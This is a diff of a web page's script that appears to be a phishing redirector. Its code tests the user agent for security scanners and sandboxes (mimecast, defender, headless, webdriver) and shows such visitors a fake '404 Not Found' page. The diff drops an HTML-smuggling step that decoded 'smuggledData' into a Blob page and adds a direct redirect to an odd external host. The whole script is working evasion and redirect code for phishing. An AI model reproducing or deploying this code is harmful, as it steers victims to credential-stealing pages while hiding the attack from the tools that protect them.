@@ -38,26 +38,21 @@
 </div>		
 
 <script>
-
+ 
     const botPatterns = /bot|crawl|spider|slurp|mimecast|defender|sandbox|headless|inspection/i;
     if (botPatterns.test(navigator.userAgent) || window.innerWidth < 100 || navigator.webdriver) {
         document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h1>404 Not Found</h1><p>Resource temporarily unavailable.</p></div>";
         window.stop();
     }
 
-
-    const urlHash = window.location.hash.substring(1);
-
     function proceed() {
-
-        const smuggledData = "fish.raipinu.business/!ABYZlYUJ/";
+      
+        const destination = "https://nextforge.stotraitro.com/o@4ZOZeZSGm7IJolwx6N/";
         
-        const blob = new Blob([atob(smuggledData)], { type: 'text/html' });
-        const url = URL.createObjectURL(blob);
-        
-
-        window.location.href = url;
+    
+        window.location.href = destination;
     }
 </script>
+
 </body>
 </html>
